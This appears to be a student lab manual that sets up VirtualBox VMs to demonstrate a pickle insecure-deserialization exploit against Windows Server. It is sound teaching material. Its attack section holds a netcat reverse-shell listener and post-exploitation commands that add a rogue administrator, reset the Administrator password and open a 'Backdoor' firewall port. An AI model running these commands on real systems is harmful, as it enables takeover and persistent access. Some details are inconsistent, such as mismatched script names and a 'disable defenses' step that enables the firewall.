# Deployment manual - Automated PoC for Insecure Deserialization (CVE-2025-59287 simulation)

## Table of Contents

- [1. Overview](#1-overview)
  - [1.1 VMs](#11-vms)
  - [1.2 Network Configuration](#12-network-configuration)
- [2. Deployment (Step-by-step Plan)](#2-deployment-step-by-step-plan)
  - [2.1 Preparation](#21-preparation)
  - [2.2 Script Configuration](#22-script-configuration)
  - [2.3 Execution](#23-execution)
  - [2.4 Automatic Handling](#24-automatic-handling)
  - [2.5 Verification](#25-verification)
- [3. Attack - Python Pickle & Insecure Deserialization](#3-attack---python-pickle--insecure-deserialization)
  - [3.1 Introduction](#31-introduction)
  - [3.2 Attack flow](#32-attack-flow)
  - [3.3 Conclusion & Impact](#33-conclusion--impact)

## 1. Overview

We demonstrate a Python-based deserialization vulnerability via `pickle`.
The full infrastructure is automated via `VBoxManage`, making the environment fully reproducible.

### 1.1 VMs

- Target: Windows Server 2022 (`192.168.56.10`)
- Attacker: Kali Linux (`192.168.56.20`)

### 1.2 Network Configuration

- Type: NAT-Network (`NPE_NAT`)
- Subnet: `192.168.56.0/24`
- DHCP: Disabled (IPs are statically configured via the script)

---

## 2. Deployment (Step-by-step Plan)

Follow these steps to deploy the lab:

### 2.1 Preparation

- Ensure that the downloaded folder `CYSEC-NPE` is located at the following location and unzip it: `C:\Users\<your username>`
- Download the VDIs to the folder `C:Users\<your username>\CYSEC_NPE`:
  - Kali: [kali.org](https://www.kali.org/get-kali/#kali-virtual-machines) (place the .vdi in the folder `C:Users\<your username>\CYSEC_NPE`)
  - Windows Server 2022: [OneDrive](https://hogent-my.sharepoint.com/personal/marc_depotter_student_hogent_be/_layouts/15/onedrive.aspx?e=5%3Aa318b1e992d24163b328c73a0d7ce8af&sharingv2=true&fromShare=true&at=9&CT=1778222935612&OR=OWA%2DNT%2DMail&CID=e3e38ddc%2D2a5b%2D413e%2Db372%2D755f20d91818&clickParams=eyJYLUFwcE5hbWUiOiJNaWNyb3NvZnQgT3V0bG9vayBXZWIgQXBwIiwiWC1BcHBWZXJzaW9uIjoiMjAyNjA1MDEwMDEuMDkiLCJPUyI6IldpbmRvd3MgMTEifQ%3D%3D&cidOR=Client&id=%2Fpersonal%2Fmarc%5Fdepotter%5Fstudent%5Fhogent%5Fbe%2FDocuments%2FCybersec%20opdracht&FolderCTID=0x01200081976029B8A8E54CA82EF7E46AE3F54F&view=0)(unzip the file and move the .VDI to the folder `C:Users\<your username>\CYSEC_NPE` first!)
- Ensure that VirtualBox and the accompanying `VBoxManage` tool (part of the installation) are available in your system path

### 2.2 Script Configuration

- Open `server-install.ps1` in an editor of your choice (e.g., VS Code) from the location `C:\Users\<your username>\CYSEC_NPE\scripts`
- Check whether the paths to the vulnerability scripts (`$WSUS_SCRIPT`, etc.) and VDIs correctly point to the actual paths on your system

### 2.3 Execution

- Open the `Terminal` app
- Navigate to the correct folder: `cd C:Users\<jouw gebruikersnaam>\CYSEC_NPE\scripts`
- Execute the installation script with: `./server-install.ps1`

### 2.4 Automatic Handling

- The script cleans up old VM sessions
- The NAT network is configured without DHCP to prevent IP conflicts
- The disks are cloned (so that the Master VDIs remain intact)
- The VMs are configured with 4GB RAM, 2 CPUs, and the correct network adapter
- After booting, the script injects the static IPs and disables the Windows Firewall for lab purposes
- The scripts are copied to the correct VMs
  - **Note:** the `exploit-python.py` script is automatically copied to the Kali user's home directory (`/home/kali/`).<br>
    The deployment script automatically sets permissions to `rwx` for the `kali` user.
    On the Windows Server, you can find the scripts under `C:\`.
- The vulnerability services (WSUS & Python server) are started automatically

### 2.5 Verification

- Wait until the installation script finishes
- Verify the displayed IP addresses

---

## 3. Attack - Python Pickle & Insecure Deserialization

### 3.1 Introduction

In this attack, we make use of the `pickle` module in Python.
`Pickle` is widely used to convert Python objects into a byte stream (serialization) and back (deserialization).
The major danger of `pickle` is that it not only stores data, but also instructions on how the object should be reconstructed.
An attacker can craft a specific "pickled" object that directly executes a system command upon unpackaging on the server.
This makes it a classic and highly potent example of an _Arbitrary Code Execution_ vulnerability.

### 3.2 Attack flow

**1. If not done already, start the Windows Server and Kali Linux VM**

> Note: normally, the VMs are started via the `./server-install.ps1` script

```bash
VBoxManage startvm "WSUS-Target" --type gui
VBoxManage startvm "Kali-Linux" --type gui
```

**2. Prepare the Reverse Shell Listener**

Open a terminal on Kali and start a listener.

```bash
nc -lvnp 4444
```

**3. Execute the exploit**

Open a second terminal on Kali and launch the attack:

```bash
python3 exploit-python.py
```

**4. Result**

Reverse shell obtained on Kali.
At this point, we can access all sensitive information on the server.

**1.** Create a new user and password

```powershell
net user Pawny HappyHacking! /add
net localgroup Administrators Pawny /add
```

**2** Change the Administrator's password

```powershell
net user Administrator YouGotPawned!
```

**3** Disable defenses: Firewall manipulation

```powershell
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
# Maar open specifiek een poort voor onze malware:
New-NetFirewallRule -DisplayName "Backdoor" -Direction Inbound -Protocol TCP -LocalPort 443 -Action Allow
```

**4** The sky is the limit (activate RDP via the Shell, encrypt documents on the server or simply overwrite them (ransomware),...)

### 3.3 Conclusion & Impact

The successful execution of `exploit.py` shows that an attacker can gain full control over the server with just a single network packet.
In this simulation, we obtained a Reverse Shell. This means the server itself establishes a connection to the attacker,
which is often not blocked by firewalls (as it is outbound traffic). The impact is huge: the attacker can steal files,
modify the WSUS configuration to distribute malware to other clients, or use the server as a stepping stone to the rest of the corporate network.
